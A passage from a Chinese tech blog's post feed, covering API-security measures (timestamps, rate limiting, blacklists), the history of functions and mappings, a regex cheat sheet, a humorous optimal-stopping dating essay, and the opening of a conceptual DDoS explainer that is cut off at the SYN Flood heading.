title="时间戳机制"></a>时间戳机制</h3><p>解密后的数据，经过签名认证后，我们拿到数据包中的客户端时间戳字段，然后用服务器当前时间去减客户端时间，看结果是否在一个区间内，伪代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> interval=<span class="number">5</span>*<span class="number">60</span>*<span class="number">1000</span>；<span class="comment">//超时时间</span></span><br><span class="line"><span class="keyword">long</span> clientTime=request.getparameter(<span class="string">"clientTime"</span>);</span><br><span class="line"><span class="keyword">long</span> serverTime=System.currentTimeMillis();</span><br><span class="line"><span class="keyword">if</span>(serverTime-clientTime&gt;interval)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">"超过处理时长"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AppId-机制-1"><a href="#AppId-机制-1" class="headerlink" title="AppId 机制"></a>AppId 机制</h3><p>生成一个唯一的 AppId 即可，密钥使用字母、数字等特殊字符随机生成即可；生成唯一 AppId 根据实际情况看是否需要全局唯一；但是不管是否全局唯一最好让生成的 Id 有如下属性：</p><ul><li>趋势递增：这样在保存数据库的时候，使用索引性能更好；</li><li>信息安全：尽量不要连续的，容易发现规律；</li></ul><p>关于全局唯一 Id 生成的方式常见的有类 snowflake 方式等；</p><h3 id="限流机制-1"><a href="#限流机制-1" class="headerlink" title="限流机制"></a>限流机制</h3><p>常用的限流算法包括：令牌桶限流，漏桶限流，计数器限流；</p><h4 id="令牌桶限流"><a href="#令牌桶限流" class="headerlink" title="令牌桶限流"></a>令牌桶限流</h4><p>令牌桶算法的原理是系统以一定速率向桶中放入令牌，填满了就丢弃令牌；请求来时会先从桶中取出令牌，如果能取到令牌，则可以继续完成请求，否则等待或者拒绝服务；令牌桶允许一定程度突发流量，只要有令牌就可以处理，支持一次拿多个令牌；</p><h4 id="漏桶限流"><a href="#漏桶限流" class="headerlink" title="漏桶限流"></a>漏桶限流</h4><p>漏桶算法的原理是按照固定常量速率流出请求，流入请求速率任意，当请求数超过桶的容量时，新的请求等待或者拒绝服务；可以看出漏桶算法可以强制限制数据的传输速度；</p><h4 id="计数器限流"><a href="#计数器限流" class="headerlink" title="计数器限流"></a>计数器限流</h4><p>计数器是一种比较简单粗暴的算法，主要用来限制总并发数，比如数据库连接池、线程池、秒杀的并发数；计数器限流只要一定时间内的总请求数超过设定的阀值则进行限流；</p><p>具体基于以上算法如何实现，Guava 提供了 RateLimiter 工具类基于基于令牌桶算法：<br>RateLimiter rateLimiter = RateLimiter.create(5);<br>以上代码表示一秒钟只允许处理五个并发请求，以上方式只能用在单应用的请求限流，不能进行全局限流；这个时候就需要分布式限流，可以基于 redis+lua 来实现；</p><h3 id="黑名单机制-1"><a href="#黑名单机制-1" class="headerlink" title="黑名单机制"></a>黑名单机制</h3><p>如何为什么中黑我们这边不讨论，我们可以给每个用户设置一个状态比如包括：初始化状态，正常状态，中黑状态，关闭状态等等；或者我们直接通过分布式配置中心，直接保存黑名单列表，每次检查是否在列表中即可；</p><h3 id="数据合法性校验-1"><a href="#数据合法性校验-1" class="headerlink" title="数据合法性校验"></a>数据合法性校验</h3><p>合法性校验包括：常规性校验以及业务校验；</p><ul><li>常规性校验：包括签名校验，必填校验，长度校验，类型校验，格式校验等；</li><li>业务校验：根据实际业务而定，比如订单金额不能小于 0 等；</li></ul>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Function And Mapping</title>
      <link href="/2020/01/17/Function-And-Mapping/"/>
      <url>/2020/01/17/Function-And-Mapping/</url>
      
        <content type="html"><![CDATA[<h2 id="函数的前世"><a href="#函数的前世" class="headerlink" title="函数的前世"></a>函数的前世</h2><p>函数，它是微积分的研究对象。</p><h3 id="函数概念要解决什么问题？"><a href="#函数概念要解决什么问题？" class="headerlink" title="函数概念要解决什么问题？"></a>函数概念要解决什么问题？</h3><p>它产生于16、17世纪，起因是生产和科学技术的发展要求数学研究运动和变化中的数量关系。那么如何研究？数学家们首先创造一个变量的概念，然后紧接着又定义一个函数概念，函数就是研究变量一个工具和办法。</p><blockquote><p>概括性地讲，函数要描述两个变量之间的相互依赖、转化的关系，这就是函数的本质。</p></blockquote><h3 id="伟大的概念"><a href="#伟大的概念" class="headerlink" title="伟大的概念"></a>伟大的概念</h3><p>函数是从常量数学迈进变量数学的标志。16世纪以前，数学研究的多为静止不动的常量，称为常量数学或者初等数学。16世纪，变量和函数概念产生标志着数学从常量时代进入到变量时代。</p><h3 id="函数一词的最初含义"><a href="#函数一词的最初含义" class="headerlink" title="函数一词的最初含义"></a>函数一词的最初含义</h3><p>函数概念在其产生后的200多年间经历了五次大的演变，这里面既有质的改变，也有形式内容上的完善，其中前几次演变与微积分学有密切关系。<br>17世纪上半叶，伽利略和笛卡尔最先提出了函数的思想。笛卡尔在1637年出版的《几何学》中引入坐标系，他注意到平面上点的坐标 （x，y）中的y依赖于x变化。1673年微积分的创立者之一德国数学家莱布尼茨最早使用了“functoin（函数）”一词，最初函数表示幂（），后来又用函数表示在直角坐标系中曲线上一点的横坐标、纵坐标。与此同时，牛顿在微积分的讨论中，使用“流量”来表示变量间的关系。<br>17世纪下半叶微积分初创时，函数没有明确一般意义，最初含义是曲线上变动点（量），大部分函数被当作曲线来研究。而微积分初创期，研究对象就是曲线。<br><strong>所以我们在研究和理解微积分时，在许多不需要太严格的情况下，可以把函数理解为曲线，这样便于学习。</strong></p><h3 id="解析式说"><a href="#解析式说" class="headerlink" title="解析式说"></a>解析式说</h3><p>随后微积分的发展促使函数概念用解析表达式（即联系两个变量之间关系的数学算式）表示，这是函数概念的第一次重大演变。1694年，瑞士数学家约翰伯努利首先给出“解析式说函数概念”。约翰伯努利的学生、数学王子、瑞士数学家欧拉1748年在其著作《无穷小分析论》中对伯努利的定义作部分修正：一个变量的函数是由该变量和一些数或常量以任何一种方式构成的解析表达式。同时，欧拉发明利用英语单词“function＂的首个字母f当作函数符号f(x）。<br>查词典可知，函数的英文“functoin”一词有“(机器等)工作、运行”的释义。所以，在当时通俗形象理解，函数就是一种运算机器，以f(x)=为例，它就是一台“平方机器”，进去的是±5，出来的是25；若进去的是“□”，出来的就是“□^2”<br>函数的解析式说定义在18世纪大部分时间占有统治地位，它的优点是“解析式”是具体可以看到的东西，对帮助初学者理解函数概念是十分有益的。实际上，微积分要研究的大多数函数都是有解析式。另外，利用函数解决实际问题时，需要建立函数模型，只有找到数学解析式，才能通过讨论和计算使得问题得以解决。它的不足是，把用图形、表格及其他方式给出的函数都排斥在外。<br><strong>总结一下，函数的最初含义和解析式定义是最能反映函数直观特征，是最容易被普通人所理解的通俗讲法。虽然它没有反映出函数的本质——两个变量之间的对应关系，其中最显著的对应关系就是相互依赖关系。</strong></p><h3 id="中文“函数”的含义"><a href="#中文“函数”的含义" class="headerlink" title="中文“函数”的含义"></a>中文“函数”的含义</h3><p>1859年，清代著名数学家（清代数学第一人）李善兰将美国一本代数和微积分教材翻译中文（中国第一本微积分教材），把“function”翻译成“函数”。在中国古代，“函”与“含”通用，都有“包含”的意思。书中定义为“凡式中含天，为天之函数”，中国古代用天、地、人、物四个字表示四个不同的未知数或未知量，因此，该定义翻译成现代文就是“凡是公式中含有变量x，则该式子称为x的函数”。书中又解释道：“凡此变数中函彼变数者，则此为彼之函数”,即一个量中包含另一个量，则这个量就是另一量的函数。李善兰所译的函数概念是解析式说定义。<br>举例子说明一下。x^2, x^2-1, y^2是函数吗？是的，都是函数，x^2, x^2-1是x的函数，y^2是y的函数。只不过，它们是简约版的表达，一般表达是f(x)=x^2，或y=x^2。</p><h3 id="变量依赖说"><a href="#变量依赖说" class="headerlink" title="变量依赖说"></a>变量依赖说</h3><p>函数概念的第二次重大演变是用“运动与变化”的观点给函数下定义。1８世纪中期，数学家们一直在争论振动弦问题：“一根两端固定的弹性弦被变形成某种初始形状，然后被释放出来振动。问题是描述确定某时刻弦形状的函数。”这场辩论对函数概念的演变产生了重要的影响，出于刻画弦形状的函数的需要，数学家围绕“如果两个表达式在某个区间一致，那是否处处一致？”这一问题展开了争论。如果函数被定义为解析式，那么答案是肯定的，曲线的一小部分已经决定了其表达式，从而决定曲线整体的位置，而欧拉发现某些分段函数不符合这一规律，同时徒手画的曲线也不满足这一规律。<br>因此，数学家们开始意识到用“解析式”定义函数已经不够完善了，于是1775年，欧拉在《微分基础》中更新了函数定义：“如果某些量依赖于另一些量，当后面这些量变化时，前面这些变量也随之变化，则前面的量称为后面的量的函数。”函数的“变量依赖说”定义由此诞。<br>变量依赖说的进步之处在于，不管函数f(x）是用一个解析式（一个或多个）、还是没有解析式表示，只要由自变量的一个值可以决定因变量的相应值，f(x）就是y的函数。它反映了函数概念中的辩证思想，体现了从“自变”到“因变”的过程，从“关注结果”转向“关注过程”，这是数学发展史上的重大进步。<br>所以《高等数学》(同济版,第七版)第1页第一段话第二句：所谓函数关系就是变量之间的依赖关系，目的是为了突出函数的灵魂（“变化”）。</p><h3 id="变量对应说"><a href="#变量对应说" class="headerlink" title="变量对应说"></a>变量对应说</h3><p>函数概念的本质是变量之间的对应关系（规律），只有突出对应关系在函数定义中的地位，才能真正把握函数概念。<br>德国数学家狄利克雷在1837年给出“变量对应说”定义：“如果对于给定区间上的每个x的值，y总有完全确定的值与之对应，那么y就叫做x的函数”。他进一步还指出，y依赖于x关系是否可用数学运算式来表达，无关紧要。1851年德国数学家黎曼把函数定义中的“完全确定的值”改为“唯一的一个值”。这是函数概念的第三次重大演变。<br>从欧拉以来，数学家实际上都将函数认为是解析式或曲线，而狄利克雷首次将函数看成任意的变量对应关系，并且他举出了“性状极怪”的函数实例，即狄利克雷函数，其意义在于：它突破了以往人们对于函数的印象，是第一个既不是由一个解析式表示，也不是徒手绘制的曲线；它说明函数具有“任意配对”的本质。</p><h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><blockquote><p>先有函数概念，后有映射概念，映射概念是脱胎于函数概念，是函数概念推广（拓广），映射概念大于函数概念，两者本质是一样。</p></blockquote><h3 id="集合论"><a href="#集合论" class="headerlink" title="集合论"></a>集合论</h3><p>集合论要解决的基本问题就是：无穷是什么？集合论讲，无穷是一个集合，集合可以运算，可以比较大小。</p><p>集合论的方法是：用“集合”来研究“无穷”。人类几千年无法破解“无穷”，主要卡在“无穷”所涉及的个体是无穷无尽的，没法具体数清楚准确的个数，更无法进行数学运算。康托尔采取一个全新的办法，它就是：既然个数无穷无尽、数不清楚，那么就把全部个体当成一个整体来看待，当成一个集合来研究。集合，我们可以理解为“一个集装箱”，把某类数的全体、某类元素的全体“打包装箱”成一个整体（一个集合）；然后重点研究各集合之间的关系，通过关系的研究去解决问题。例如通过研究不同集合内部元素之间一一对应关系，发现并证明：无穷有大小之分，自然数、整数和有理数的个数是相同等许多重要的、突破性的结论。</p><p>那么，什么是关系？集合之间有什么关系？说白了，数学就是一种高级系统。在任何系统中，“关系”是核心内容，是系统的第一特征。没有关系就谈不上系统，关系愈丰富、愈深刻、愈复杂，则系统愈高级、愈活跃、愈完善．数学也如此，没有了关系，数学仅有“数”而无“学（探讨规律）”的东西了。反之，有了关系，则“数”不仅是数（量），也可以是变数、模数（即模量）、函数，从而成为“数学”。</p><p>数学系统与其它系统相比，有一个重要特征。它不仅在于维持、演绎着它的关系、更在于开发、创造着新的关系。利用关系可从已知推无知，从有限探无限，从关系推关系，从而使得数学系统日益复杂、完善。</p><p>虽然数学中的关系不可一一枚举，但其中最基本的是（两个对象间的）“二元关系”。从二元关系角度，集合论把数学关系可以归纳为序关系、等价关系、运算关系、映射关系等几种基本类型。</p><h3 id="映射-1"><a href="#映射-1" class="headerlink" title="映射"></a>映射</h3><p>“映射”是集合论中最为基本、最为普遍的一个概念，包括“运算”也可以认为是一种映射。德国数学家戴德金在1887年借鉴“函数”概念中“对应法则”给出“映射”的定义：系统S上的一个映射蕴涵了一种规则，按照这种规则，S中每一个确定的元素s（小s）都对应着一个确定的对象，它被称为s（小s）的映象，记作φ（s）。我们也可以说，φ（s）对应于元素s，φ（s）由映射φ作用于s而产生或导出；s经映射φ交换成φ（s）。</p><p>这个的定义是描述性的，本质就是“映射”是一类因果演化方式的形象描述，这种“因果演化”表明：一个集合中的元素（因）按确定的方式（或叫规则）φ转化为另一个集合中的元素（果）。需要说明的是，这里的“因果演化”与数学定理的因果证明(演算)是不同的，所以映射只能算一类因果演化。</p><p>《高等数学》(同济版,第七版)第1页的映射定义如下：设X、Y是两个非空集合，如果存在一个法则 f，使得对X中每个元素x按法则 f，在Y中有唯一确定的元素y与之对应，那么称f 为从X到Y的映射，记作f：X→Y。</p><p>因为映射关系脱胎于“函数”概念中“对应法则”，所以粗略地讲，“映射”概念在很多情况下等同于“函数”概念，“映射”是“函数”概念在集合论中推广（拓广）。也就是说，映射包含函数，函数是映射的一个特例，即实数集到实数集的映射，其特征是能写出函数表达式或具有函数式特征。</p><p>而“映射”则比较为广义。它既可表示已经形式化了的映射关系，也可表示未经（难以）形式化的映射关系，比如可说建模活动也是一种映射；从实践中提取某种信息也一是种映射；所有生产过程也是一种映射；专家凭经验对某事物给出评价、打分也是一种映射；一切因果演化都叫做映射。甚至于，序关系和运算关系也可以理解为一种（二元）映射，也可以用映射的方式来叙述它们。</p><h2 id="函数的今生"><a href="#函数的今生" class="headerlink" title="函数的今生"></a>函数的今生</h2><h3 id="集合对应说"><a href="#集合对应说" class="headerlink" title="集合对应说"></a>集合对应说</h3><p>集合论诞生后，函数定义中加入集合和映射的内容，这个定义是黎曼等的“变量对应说”与戴德金的映射结合在一起演变出来的，目前我国高中数学教材中普遍使用它，表达为：设 A、B为两个非空集合，如果按某个确定的对应关系，对于集合A中每一元素x，总有集合B中唯一确定的元素y与之对应，那么这个对应关系叫做一个映射。当 A、B为非空数集时，这样的映射就称为函数。<br>利用集合之间的“对应关系”给函数下定义，摆脱了“变量”对函数概念的约束，使得函数概念的适用范围更为广泛。因此，是函数概念的第四次重大演变。</p><h3 id="集合关系说"><a href="#集合关系说" class="headerlink" title="集合关系说"></a>集合关系说</h3><p>“变量对应说＂定义中虽然突出了“对应法则”的地位、但对应法则 f是什么尚欠明确定义（或者说回避交代）因而显得含糊。为了回避“对应”，德国数学家豪斯多夫在他的《集合论纲要》（1914年）用“序偶”来定义函数，但“序偶”的含义又是不明确的。波兰数学家库拉托夫斯基于1921年用集合概念定义“序偶”，对豪斯多夫的定义加以完善在此基础上，1939年法国的布尔巴基学派对“关系”加以限制给出下述十分形式化、抽象化的函数定义：</p><p>设A与B是给定的数集， f是笛卡儿乘积集A×B(=｛（x,y)l x∈A，y∈B})的一个子集（也称A与B的一个关系），如果对于任何x∈A，存在唯一的y∈B,使得（x，y）∈ f（等价于若（x,y), (x, z）∈f，则必有y＝ z），则称 f是定义在A上、取值在B中的函数。</p><p>“集合关系说”是用集合论的语言，即对笛卡儿乘积集加以适当限制再对函数下定义，消除了“变量”“对应”等含义模糊的用语，因而是完全数学化的定义。按照这一定义方式，函数概念完全明确了所谓“函数’无非就是一张“表”，借此表给出x的值，可以知道相应的y的值。这种定义方式的最大优越性，还在于把几何与代数有机统一起来，定义中的“f”既可以看成对应法则，也可以看成函数的图像（而且适用于不同的坐标系）。进一步，这种完全形式化的定义还便于为计算机所接受由此可见，这种高度统一、形式化函数定义，函数概念的第五次重大演变。</p><p>不过，这种定义方式由于过于形式化，抽去了函数关系生动的直观（变化）特征，看不到直接的“对应关系”，更加没有明显的解析式，因此初学者难以掌握。也许正是基于这个理由，目前中学数学教材中普遍不使用这种“最现代化”的函数定义方式。</p><p>最后总结一下，如果再有人问，什么是函数？通俗讲，人类为了研究运动和变化，开始关注变量之间的关系，发现两个变量之间有一种互相依赖的关系，即A变量变化、B变量也随着变化，西方人便给这个关系取名“function＂。</p><p>这种变量之间互相依赖的关系，本质是什么？三百年间，人类不断探索，认识不断提高，前后经历5个阶段，目前的认识是把它当成集合间的“映射”关系。</p><p>那么“映射”又是什么关系？就是“对应”关系。</p><p>1859年，李善兰根据18世纪时的定义，把“function＂翻译成“函数”，“函”是“含有”的意思，即“A变量中含有B变量，A变量可以用B变量的代数式来表达”。为什么用此“函”，不用彼“含”？因为“function＂还有另一个含义，它是一种“运算机器”，类似一个大铁盒子。</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Regex</title>
      <link href="/2020/01/13/Regex/"/>
      <url>/2020/01/13/Regex/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Regular expression (regex/regexp)<br>正则表达式是一种从左到右匹配主体字符串的模式<br>正则表达式可以从一个基础字符串中根据一定的匹配模式替换文本中的字符串、验证表单、提取字符串等等<br><a href="https://regex101.com/" target="_blank" rel="noopener">在线正则</a></p></blockquote><h2 id="基本匹配"><a href="#基本匹配" class="headerlink" title="基本匹配"></a>基本匹配</h2><p>正则表达式其实就是在执行搜索时的格式，它由一些字母和数字组合而成。例如：一个正则表达式 the，它表示一个规则：由字母t开始，接着是h，再接着是e。正则表达式是大小写敏感的。</p><h2 id="元字符-meta-character"><a href="#元字符-meta-character" class="headerlink" title="元字符 meta character"></a>元字符 meta character</h2><blockquote><p>正则表达式主要依赖于元字符。 元字符不代表他们本身的字面意思，他们都有特殊的含义。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">——————点运算符</span><br><span class="line">.句号匹配任意单个字符除了换行符。</span><br><span class="line"></span><br><span class="line">——————字符集与否定字符集</span><br><span class="line">[ ]字符种类。匹配方括号内的任意字符。不关心顺序。[.]方括号中的句号就表示句号，不是元字符。</span><br><span class="line">[^ ]否定的字符种类。匹配除了方括号里的任意字符。不关心顺序。</span><br><span class="line"></span><br><span class="line">——————重复次数</span><br><span class="line">*匹配&gt;&#x3D;0个重复的在*号之前的字符。</span><br><span class="line">+匹配&gt;&#x3D;1个重复的+号前的字符。</span><br><span class="line">?标记?之前的字符为可选，即出现 0 或 1 次。</span><br><span class="line"></span><br><span class="line">——————&#123;&#125;，是一个量词</span><br><span class="line">&#123;n,m&#125;匹配num个大括号之间的字符 (n &lt;&#x3D; num &lt;&#x3D; m).</span><br><span class="line">&#123;n,&#125;匹配num个大括号之间的字符 (n &lt;&#x3D; num).</span><br><span class="line">&#123;,m&#125;匹配num个大括号之间的字符 (num &lt;&#x3D; m).</span><br><span class="line">&#123;n&#125;匹配num个大括号之间的字符 (n &#x3D; num).</span><br><span class="line"></span><br><span class="line">——————(...) 特征标群</span><br><span class="line">(xyz)字符集，匹配与 xyz 完全相等的字符串，() 中用或字符 | 表示或。</span><br><span class="line"></span><br><span class="line">—————— | 或运算符</span><br><span class="line">|或运算符，匹配符号前或后的字符。</span><br><span class="line"></span><br><span class="line">——————转码特殊字符</span><br><span class="line">\转义字符,用于匹配一些保留的字符 [ ] ( ) &#123; &#125; . * + ? ^ $ \ |</span><br><span class="line"></span><br><span class="line">——————锚点</span><br><span class="line">^用来检查匹配的字符串是否在所匹配字符串的开头。</span><br><span class="line">$用来匹配字符是否是最后一个，例如(at\.)$ 匹配以 at. 结尾的字符串。</span><br><span class="line"></span><br><span class="line">——————只匹配不获取</span><br><span class="line">?:加在目标之前</span><br></pre></td></tr></table></figure><h2 id="简写字符集"><a href="#简写字符集" class="headerlink" title="简写字符集"></a>简写字符集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">大写和小写互补，两者加一起是全集</span><br><span class="line"></span><br><span class="line">\b匹配空字符串，但仅适用于单词的“首尾”</span><br><span class="line">\B匹配空字符串，但仅适用于单词的“非首尾”</span><br><span class="line">.除换行符外的所有字符</span><br><span class="line">\w匹配所有字母数字下划线，等同于 [a-zA-Z0-9_]</span><br><span class="line">\W匹配所有非字母数字，即符号，等同于： [^\w]</span><br><span class="line">\d匹配数字： [0-9]</span><br><span class="line">\D匹配非数字： [^\d]</span><br><span class="line">\s匹配所有空格字符，等同于： [\t\n\f\r\p&#123;Z&#125;]</span><br><span class="line">\S匹配所有非空格字符： [^\s]</span><br><span class="line">\f匹配一个换页符</span><br><span class="line">\n匹配一个换行符</span><br><span class="line">\r匹配一个回车符</span><br><span class="line">\t匹配一个制表符</span><br><span class="line">\v匹配一个垂直制表符</span><br><span class="line">\p匹配 CR&#x2F;LF（等同于 \r\n），用来匹配 DOS 行终止符</span><br><span class="line">\A匹配句子的“开头”字符，等价于 ^</span><br><span class="line">\Z匹配句子的“结尾”字符，等价于 $</span><br></pre></td></tr></table></figure><h2 id="零宽度断言（前后预查）"><a href="#零宽度断言（前后预查）" class="headerlink" title="零宽度断言（前后预查）"></a>零宽度断言（前后预查）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?&#x3D;正先行断言-存在    (T|t)he(?&#x3D;\sfat): 判断 The 或 the 后面是否紧跟着 (空格)fat，匹配对象是 The、the，不是\sfat</span><br><span class="line">?!负先行断言-排除</span><br><span class="line">?&lt;&#x3D;正后发断言-存在    (?&lt;&#x3D;(T|t)he\s)(fat|mat): 匹配 fat 和 mat，且其前跟着 The 或 the</span><br><span class="line">?&lt;!负后发断言-排除</span><br></pre></td></tr></table></figure><h2 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志/模式修正符"></a>标志/模式修正符</h2><blockquote><p>用来修改表达式的搜索结果。这些标志可以任意的组合使用，它也是整个正则表达式的一部分。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">i忽略大小写。</span><br><span class="line">g全局搜索。</span><br><span class="line">m多行修饰符：锚点元字符 ^ $ 工作范围在每行的起始。</span><br><span class="line"></span><br><span class="line">&#x2F;The&#x2F;gi 全局搜索所有不分大小写的the</span><br><span class="line"></span><br><span class="line">以下匹配上了fat、cat、mat</span><br><span class="line">&#x2F;.at(.)?$&#x2F;gm &#x3D;&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure><h2 id="贪婪匹配与惰性匹配"><a href="#贪婪匹配与惰性匹配" class="headerlink" title="贪婪匹配与惰性匹配"></a>贪婪匹配与惰性匹配</h2><blockquote><p>正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 ? 将贪婪匹配模式转化为惰性匹配模式。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以下除了最后的 . ，其他全部匹配上</span><br><span class="line">(.*at) &#x3D;&gt; The fat cat sat on the mat.</span><br><span class="line"></span><br><span class="line">以下只匹配了 The fat </span><br><span class="line">(.*?at) &#x3D;&gt; The fat cat sat on the mat.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Regex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Monte Carlo Programming</title>
      <link href="/2020/01/06/Monte-Carlo-Programming/"/>
      <url>/2020/01/06/Monte-Carlo-Programming/</url>
      
        <content type="html"><![CDATA[<p>找对象很容易陷入纳什均衡。<br>我们可以利用在数学上被称为“最优停止问题”，它有一个很巧妙的策略。</p><p>假设一个女生遇到了三个男生。如果她两眼一闭，随机选择，那有1/3的概率选到最优秀的男生。</p><p>但其实她还有一种先舍后得的策略：先跟第一个男生处一处，不管他好不好都果断分手；然后考察第二个男生，如果他比第一个男生优秀，就正式在一起；如果他不如第一个男生，那就分手，和第三个男生在一起。</p><p>这种策略看似耍流氓，但对于三个男生一共有6种排序，采用这种策略，我们以1为最好，3为最差，排查一下：<br>123，则舍弃1-舍弃2-选中3<br>132，则舍弃1-舍弃3-选中2<br>213，则舍弃2-选中1<br>231，则舍弃2-舍弃3-选中1<br>312，则舍弃3-选中1<br>321，则舍弃3-选中2</p><p>这样有1/2的概率选中最优秀的男生，1/3概率选到第二优秀的，1/6概率选到最差的。</p><p>所以鲁迅先生早就说过：初恋不值得！它只是寻找真爱的垫脚石。<br>情场老手一般都会先随意谈上几段恋情，观察一下整体情况，然后再做出决策。那么最好的策略是观察多少个人呢？<br>假设一共有n个人备选，你先观察观察前k个人，但都放弃，从第k+1个人开始，一旦遇到一个比前面都优秀的，就和他在一起。<br>我们来求一下k等于多少的时候， 我们有把握和最优秀的人在一起。<br>我们在小学二年级的时候就学过条件概率和黎曼和。设选到最优秀男生的概率P(k)，则有<br><img src="%E8%92%99%E7%89%B9%E5%8D%A1%E7%BD%97%E7%BC%96%E7%A8%8B-%E5%88%A9%E7%94%A8%E6%9C%80%E4%BC%98%E5%81%9C%E6%AD%A2%E9%97%AE%E9%A2%98%E9%80%89%E6%8B%A9%E5%BC%82%E6%80%A71.png" alt=""><br>在n较小时，直接一波非线性规划或者动态规划就能求解了，无非是在n!种情况中找出最优的情况。比如n=4的时候甚至可以直接穷举出最优解为k=1，概率P(1)=11/24。<br><img src="%E8%92%99%E7%89%B9%E5%8D%A1%E7%BD%97%E7%BC%96%E7%A8%8B-%E5%88%A9%E7%94%A8%E6%9C%80%E4%BC%98%E5%81%9C%E6%AD%A2%E9%97%AE%E9%A2%98%E9%80%89%E6%8B%A9%E5%BC%82%E6%80%A72.png" alt=""><br>假设你每年遇到的男生数量一样，如果找对象决策期是15岁到35岁，那22.4岁之前就是观察期，之后遇到更好的，就结婚！</p><p>我们来编个程模拟一下，首先生成一个女生，给她随机分配100个不同的男生。用蒙特卡罗模拟100万次。结果非常amazing！她有37%的概率选中最优秀的男生，14%的概率选中第二优秀的，7%概率选中第三优秀的。<br><img src="%E8%92%99%E7%89%B9%E5%8D%A1%E7%BD%97%E7%BC%96%E7%A8%8B-%E5%88%A9%E7%94%A8%E6%9C%80%E4%BC%98%E5%81%9C%E6%AD%A2%E9%97%AE%E9%A2%98%E9%80%89%E6%8B%A9%E5%BC%82%E6%80%A73.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Statistics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDOS</title>
      <link href="/2020/01/04/DDOS/"/>
      <url>/2020/01/04/DDOS/</url>
      
        <content type="html"><![CDATA[<h2 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a>DDOS攻击</h2><blockquote><p>分布式拒绝服务攻击 Distributed Denial of Service，简称DDoS。<br>是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。</p></blockquote><p>举个例子，我开了一家饭店，这家饭店可以容纳100人同时就餐，我的一个竞争对手在对门也开了一家饭店，竞争对手雇佣了300人来这个饭店坐着不吃不喝，导致饭店满满当当无法正常营业，这在计算机中的表现就是分布式拒绝服务。在计算机系统中它利用网络协议和操作系统的一些缺陷，采用欺骗和伪装的策略来进行网络攻击，使网站服务器充斥大量要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷以至于瘫痪而停止提供正常的网络服务。</p><p>在进行攻击的时候，可以对源IP地址进行伪造，通常攻击者会在发起DDOS 攻击之前就控制着成千上万个存在漏洞的计算机，这些计算机我们称之为“肉鸡”，入侵者通过这些“肉鸡”向目标机器在相同时间内发起并发请求，导致目标机器的系统资源瞬间被打满，无法正常对外提供服务。</p><p>与DoS攻击由单台主机发起攻击相比较，分布式拒绝服务攻击DDoS是借助数百、甚至数千台被入侵后安装了攻击进程的主机同时发起的集团行为。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="SYN-Flood攻击"><a href="#SYN-Flood攻击" class="headerlink" title="SYN Flood攻击"></a>SYN Flood攻击</h3><blockquote><p>SYN Flood 